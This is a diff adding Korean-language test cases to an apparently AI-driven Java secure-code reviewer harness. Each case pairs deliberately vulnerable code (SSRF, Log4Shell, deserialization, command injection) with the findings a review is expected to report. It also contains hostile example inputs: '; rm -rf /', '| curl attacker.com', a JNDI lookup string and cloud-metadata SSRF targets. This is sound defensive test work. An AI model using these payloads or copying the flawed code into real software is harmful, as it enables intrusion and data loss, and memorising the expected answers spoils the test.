@@ -1,8 +1,8 @@
 ---
 name: java-secure-coding-reviewer
 version: 0.1
-harness-version: 0.1
-last-modified: 2026-07-09
+harness-version: 0.2
+last-modified: 2026-07-29
 ---
 
 # java-secure-coding-reviewer 테스트 케이스
@@ -133,3 +133,182 @@ last-modified: 2026-07-09
   - [ ] OWASP A03 축 언급
   - [ ] `@PreAuthorize` 있다는 사실만으로 SQL Injection 예외로 인정하지 않음
 - **유형**: negative
+
+---
+
+## TC-6: Negative — MD5 CSRF 토큰 (SEC-HG-4 약한 해시)
+
+- **입력 프롬프트**: "보안 관점에서 아래 CSRF 토큰 생성 코드 리뷰. 성능 때문에 MD5 썼는데 문제 없지?\n\n```java\n// api/src/main/java/.../CsrfTokenGenerator.java (+15 -0)\n@Component\npublic class CsrfTokenGenerator {\n  private static final String SECRET = \"csrf-secret-FAKE_HARNESS_ONLY\";\n\n  public String generate(String sessionId) {\n    MessageDigest md = MessageDigest.getInstance(\"MD5\");\n    md.update((sessionId + SECRET).getBytes(StandardCharsets.UTF_8));\n    return Base64.getEncoder().encodeToString(md.digest());\n  }\n\n  public boolean verify(String sessionId, String token) {\n    return generate(sessionId).equals(token);\n  }\n}\n```\n\n브랜치: `api/feat/csrf-protection`"
+- **기대 결과**:
+  - **AUTO FAIL SEC-HG-4 판정** — MD5는 인증·서명·CSRF 토큰 용도 사용 금지 (콜리전 취약)
+  - 사용자 "성능" 요구 수용하지 않음
+  - 사유:
+    - MD5 콜리전 공격 실증 (2004년 이후) → CSRF 토큰 위조 가능
+    - CSRF 토큰은 **인증 무결성** 목적이므로 콜리전 저항성 필수
+    - SEC-HG-2 하드코딩 시크릿(CSRF secret 리터럴)도 함께 지적
+  - 대안:
+    - `HmacSHA256` + 환경변수 시크릿 (`SecureRandom`으로 초기화된 키)
+    - Spring Security `CsrfTokenRepository` 사용 (`HttpSessionCsrfTokenRepository` / `CookieCsrfTokenRepository`)
+    - `MessageDigest.getInstance("SHA-256")` 최소 요구
+  - OWASP 축: **A02 Cryptographic Failures**
+  - 리포트 시크릿 마스킹: `csrf-secret-****`
+- **검증 기준**:
+  - [ ] SEC-HG-4 AUTO FAIL 판정 (약한 해시 인증 용도)
+  - [ ] SEC-HG-2 함께 검출 (하드코딩 CSRF secret)
+  - [ ] MD5 콜리전 취약성 근거 설명
+  - [ ] "성능" 요구 수용하지 않음
+  - [ ] HmacSHA256 or Spring Security CsrfTokenRepository 대안 제시
+  - [ ] OWASP A02 축 명시
+  - [ ] CSRF secret 원본 마스킹
+- **유형**: negative
+
+---
+
+## TC-7: Happy Path — log4j-core 2.14.1 신규 의존성 (CVE Log4Shell)
+
+- **입력 프롬프트**: "보안 관점에서 신규 의존성 리뷰 부탁.\n\n```gradle\n// api/build.gradle (+3 -0)\ndependencies {\n  // 기존 의존성 ...\n  implementation 'org.apache.logging.log4j:log4j-core:2.14.1'\n  implementation 'org.apache.logging.log4j:log4j-api:2.14.1'\n}\n```\n\n```java\n// api/src/main/java/.../DiagnosticLogger.java (+8 -0)\nimport org.apache.logging.log4j.LogManager;\nimport org.apache.logging.log4j.Logger;\n\n@Component\npublic class DiagnosticLogger {\n  private static final Logger log = LogManager.getLogger();\n\n  public void logRequest(String userInput) {\n    log.info(\"Request received: {}\", userInput);\n  }\n}\n```\n\n브랜치: `api/feat/diagnostic-log`"
+- **기대 결과**:
+  - **SEC-CVE Critical 판정** — log4j-core 2.14.1은 **CVE-2021-44228 (Log4Shell)** 취약 버전
+  - 상세:
+    - JNDI Lookup 원격 실행 취약점 (2.0-beta9 ~ 2.14.1 영향)
+    - CVSS 10.0 (Critical, KEV 등재)
+    - `${jndi:ldap://...}` 형태 사용자 입력 → 원격 코드 실행 (RCE)
+    - 코드의 `log.info("...{}", userInput)` 자체가 취약점 트리거 경로
+  - 수정 방향:
+    - **즉시 2.17.1+ 업그레이드** (2.15/2.16도 후속 취약점 있음 — CVE-2021-45046, CVE-2021-45105)
+    - 가능하면 SLF4J + Logback 사용 검토 (프로젝트 컨벤션 확인)
+    - Snyk/dependency-check 정기 스캔 도입
+  - **SBOM 요청**: build.gradle 변경 있으므로 SBOM/Snyk 리포트 요청
+  - OWASP 축: **A06 Vulnerable and Outdated Components**
+  - 부수: KEV 카탈로그 (CISA) 등재 사실 명시
+- **검증 기준**:
+  - [ ] SEC-CVE Critical 판정 (Log4Shell)
+  - [ ] CVE-2021-44228 번호 정확 인용
+  - [ ] JNDI Lookup RCE 트리거 경로 설명 (userInput → log)
+  - [ ] 2.17.1+ 업그레이드 명시 (2.15/2.16는 후속 취약)
+  - [ ] SBOM/Snyk 요청 명시
+  - [ ] OWASP A06 축 명시
+  - [ ] KEV 카탈로그 등재 언급
+- **유형**: happy-path
+
+---
+
+## TC-8: Negative — 사용자 URL WebClient 직접 주입 (OWASP A10 SSRF)
+
+- **입력 프롬프트**: "보안 관점에서 아래 이미지 프록시 코드 리뷰. 사용자가 URL 넣으면 우리 서버가 프록시로 이미지 받아오는 기능이야.\n\n```java\n// api/src/main/java/.../ImageProxyController.java (+18 -0)\n@RestController\n@RequestMapping(\"/api/proxy\")\npublic class ImageProxyController {\n  private final WebClient webClient;\n\n  @GetMapping(\"/image\")\n  public Mono<byte[]> proxyImage(@RequestParam String url) {\n    return webClient.get()\n        .uri(url)\n        .retrieve()\n        .bodyToMono(byte[].class);\n  }\n}\n```\n\n브랜치: `api/feat/image-proxy`"
+- **기대 결과**:
+  - **AUTO FAIL SEC-HG-1 관점 확장 / SEC-OWASP A10 판정** — SSRF 취약점
+  - 사유:
+    - `url` 파라미터 검증 없이 WebClient에 직접 주입 → 내부망 스캔 가능 (`http://169.254.169.254/latest/meta-data/` AWS 메타데이터, `http://localhost:6379` Redis, `http://internal-service:8080/actuator` 등)
+    - `file://` / `gopher://` / `dict://` 스킴 우회로 파일 시스템 접근 가능
+    - Redirect 체이닝으로 검증 우회 가능
+  - 대안:
+    - **화이트리스트 도메인** (`Set.of("cdn.example.com", "images.example.com")`)
+    - **IP 대역 차단** (private IP 대역 `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `127.0.0.0/8`)
+    - 스킴 제한 (`http`, `https`만 허용)
+    - Redirect follow 명시 제어 (`.followRedirect(false)`)
+    - `WebClient.Builder.filter(...)` 로 요청 전 검증
+  - OWASP 축: **A10 Server-Side Request Forgery (SSRF)**
+- **검증 기준**:
+  - [ ] SSRF 취약점 명시 검출
+  - [ ] AWS 메타데이터·내부 서비스 스캔 위험 열거
+  - [ ] `file://`/`gopher://` 등 위험 스킴 언급
+  - [ ] private IP 대역 차단 대안 제시
+  - [ ] 화이트리스트 도메인 대안 제시
+  - [ ] Redirect 우회 위험 언급
+  - [ ] OWASP A10 축 명시
+- **유형**: negative
+
+---
+
+## TC-9: Edge Case — /actuator/** permitAll (OWASP A05)
+
+- **입력 프롬프트**: "보안 관점에서 SecurityConfig 리뷰. actuator 노출 관련.\n\n```java\n// api/src/main/java/.../SecurityConfig.java (+5 -2)\n@Configuration\n@EnableWebSecurity\npublic class SecurityConfig {\n\n  @Bean\n  public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n    http\n      .authorizeHttpRequests(auth -> auth\n        .requestMatchers(\"/api/public/**\").permitAll()\n        .requestMatchers(\"/actuator/**\").permitAll()  // + 신규\n        .anyRequest().authenticated()\n      )\n      .csrf(csrf -> csrf.disable());\n    return http.build();\n  }\n}\n```\n\n```yaml\n# application.yml (+3 -0)\nmanagement:\n  endpoints:\n    web:\n      exposure:\n        include: '*'\n```\n\n브랜치: `api/feat/monitoring-endpoints`"
+- **기대 결과**:
+  - **SEC-OWASP A05 High 판정** — Security Misconfiguration
+  - 사유:
+    - `/actuator/**` permitAll + `exposure.include: '*'` 조합은 **매우 위험**
+    - 노출되는 민감 엔드포인트:
+      - `/actuator/env` — 환경변수·설정값 (DB URL·시크릿 노출 가능)
+      - `/actuator/heapdump` — 힙 덤프 다운로드 (민감정보 포함)
+      - `/actuator/threaddump` — 스레드 스택 (내부 구조 노출)
+      - `/actuator/beans` — 전체 Bean 목록 (공격 표면 매핑)
+      - `/actuator/loggers` — POST로 런타임 로그 레벨 조작 가능
+      - `/actuator/shutdown` — 서비스 중단 (활성화 시)
+    - CSRF disable도 함께 지적 (관리 엔드포인트 POST 조작 위험)
+  - 대안:
+    - `include: health,info,prometheus`로 최소 노출
+    - `/actuator/**`는 **별도 포트** + 내부망만 (`management.server.port`)
+    - 또는 `hasRole('ADMIN')` 인가 (permitAll 대신)
+    - Spring Security Actuator 통합: `EndpointRequest.toAnyEndpoint()` 활용
+    - `management.endpoint.env.show-values: never`
+  - OWASP 축: **A05 Security Misconfiguration**
+- **검증 기준**:
+  - [ ] A05 판정 High 이상
+  - [ ] `exposure.include: '*'` 위험 명시
+  - [ ] env·heapdump·threaddump·beans 각각 위험 열거 (최소 4건)
+  - [ ] CSRF disable 함께 지적
+  - [ ] 별도 포트 or ADMIN 인가 대안 제시
+  - [ ] `management.endpoint.env.show-values: never` 안내
+  - [ ] OWASP A05 축 명시
+- **유형**: edge-case
+
+---
+
+## TC-10: Negative — ObjectInputStream REST body (OWASP A08)
+
+- **입력 프롬프트**: "보안 관점에서 아래 리뷰. 클라이언트 캐시 상태를 Serializable 객체로 받아서 복원해.\n\n```java\n// api/src/main/java/.../CacheStateController.java (+15 -0)\n@RestController\n@RequestMapping(\"/api/cache\")\npublic class CacheStateController {\n\n  @PostMapping(value = \"/restore\", consumes = \"application/octet-stream\")\n  public ResponseEntity<String> restore(HttpServletRequest request) throws IOException, ClassNotFoundException {\n    try (ObjectInputStream ois = new ObjectInputStream(request.getInputStream())) {\n      CacheState state = (CacheState) ois.readObject();\n      cacheService.restore(state);\n      return ResponseEntity.ok(\"restored\");\n    }\n  }\n}\n```\n\n브랜치: `api/feat/cache-restore`"
+- **기대 결과**:
+  - **AUTO FAIL SEC-OWASP A08 판정** — Software and Data Integrity Failures (역직렬화 취약점)
+  - 사유:
+    - `ObjectInputStream.readObject()`는 **Java 역직렬화 gadget chain** 취약점 (Commons Collections·Spring 등)
+    - 사용자 제어 바이트 스트림 → 클래스로더 조작 → 원격 코드 실행 가능
+    - `(CacheState)` 캐스팅은 **역직렬화 이후에 발생**하므로 방어 안 됨
+    - 유명 사고: PayPal·Jenkins·WebLogic 등 다수 RCE
+  - 대안:
+    - **JSON/Protobuf 사용** (`@RequestBody CacheState` + Jackson)
+    - 꼭 바이너리 필요 시 **화이트리스트 기반 역직렬화** (`ObjectInputFilter` JDK 9+, `Pattern.compile("com.myapp.CacheState$")`)
+    - Google `SerialKiller` 라이브러리
+    - 서명 검증 후에만 역직렬화 (HMAC)
+  - OWASP 축: **A08 Software and Data Integrity Failures**
+- **검증 기준**:
+  - [ ] A08 AUTO FAIL 판정
+  - [ ] Java gadget chain RCE 위험 설명
+  - [ ] 캐스팅이 방어책 아님 명시
+  - [ ] Jackson JSON 대안 제시
+  - [ ] `ObjectInputFilter` 화이트리스트 대안 제시
+  - [ ] OWASP A08 축 명시
+  - [ ] 유명 사고(PayPal/Jenkins/WebLogic) 언급 or 유사 참조
+- **유형**: negative
+
+---
+
+## TC-11: Happy Path — Runtime.exec(userInput) (OWASP A03 Command Injection)
+
+- **입력 프롬프트**: "보안 관점에서 아래 코드 리뷰. 관리자가 서버에서 시스템 정보 조회할 수 있게 만든 기능.\n\n```java\n// admin/src/main/java/.../SystemInfoController.java (+20 -0)\n@RestController\n@RequestMapping(\"/admin/system\")\n@PreAuthorize(\"hasRole('SUPER_ADMIN')\")\npublic class SystemInfoController {\n\n  @GetMapping(\"/exec\")\n  public String execute(@RequestParam String cmd) throws IOException {\n    Process p = Runtime.getRuntime().exec(cmd);\n    return new String(p.getInputStream().readAllBytes(), StandardCharsets.UTF_8);\n  }\n\n  @GetMapping(\"/ping\")\n  public String ping(@RequestParam String host) throws IOException {\n    Process p = Runtime.getRuntime().exec(\"ping -c 3 \" + host);\n    return new String(p.getInputStream().readAllBytes(), StandardCharsets.UTF_8);\n  }\n}\n```\n\n브랜치: `admin/feat/system-info`"
+- **기대 결과**:
+  - **AUTO FAIL SEC-HG-1 계열 / SEC-OWASP A03 Command Injection 판정 2건**
+  - `/exec` 엔드포인트:
+    - **Runtime.exec(String)에 사용자 입력 직접 전달** — 완전한 임의 명령 실행
+    - `@PreAuthorize` 있어도 관리자 계정 탈취 시 서버 완전 장악
+    - 기능 자체를 **삭제 권장** (진단은 관측 도구로 대체 — Prometheus, GCP Cloud Logging)
+  - `/ping` 엔드포인트:
+    - `"ping -c 3 " + host` 조합 → `; rm -rf /` 이나 `| curl attacker.com` 등 명령 삽입 가능
+    - `Runtime.exec(String[])` 배열 형태로 호출해도 `host` 자체가 검증 없으면 여전히 위험
+  - 대안:
+    - `/exec` **완전 삭제** — 어떤 대안도 부적절
+    - `/ping`:
+      - 호스트 화이트리스트 (내부 서비스만) + 정규식 검증 (`^[a-zA-Z0-9.-]+$`)
+      - `Runtime.exec(new String[]{"ping", "-c", "3", host})` 배열 인수 (shell metacharacter 우회 방지)
+      - 또는 `InetAddress.isReachable()` 사용 (Runtime.exec 회피)
+  - OWASP 축: **A03 Injection (Command Injection)**
+- **검증 기준**:
+  - [ ] `/exec` 즉시 삭제 권장 (완전 임의 명령 실행)
+  - [ ] `/ping` Command Injection 위험 명시 (`; rm -rf /` 등 예시)
+  - [ ] `@PreAuthorize`만으로 방어 불가 명시 (Insider Threat)
+  - [ ] `Runtime.exec(String[])` 배열 인수 대안 (`/ping`용)
+  - [ ] 화이트리스트 검증 (정규식 + Set)
+  - [ ] `InetAddress.isReachable()` 대안 언급
+  - [ ] OWASP A03 축 명시 (Command Injection sub-category)
+  - [ ] 관측 도구 대안 (Prometheus/Cloud Logging) 언급
+- **유형**: happy-path
